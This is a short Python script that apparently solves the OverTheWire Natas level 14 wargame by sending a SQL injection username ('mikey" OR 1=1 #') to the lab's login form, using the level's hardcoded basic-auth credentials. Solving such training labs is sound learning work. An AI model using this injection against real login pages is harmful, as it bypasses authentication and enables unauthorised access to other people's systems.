from bs4 import BeautifulSoup as bs
import urllib
import base64
import binascii
import requests
import re

u='natas14'
p='Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
l=f'http://{u}.natas.labs.overthewire.org/?debug=true'
uname='mikey" OR 1=1 #'
pswd='2520'
resp=requests.post(l,data={'username':uname,'password':pswd},auth=(u, p))
print(resp.text)
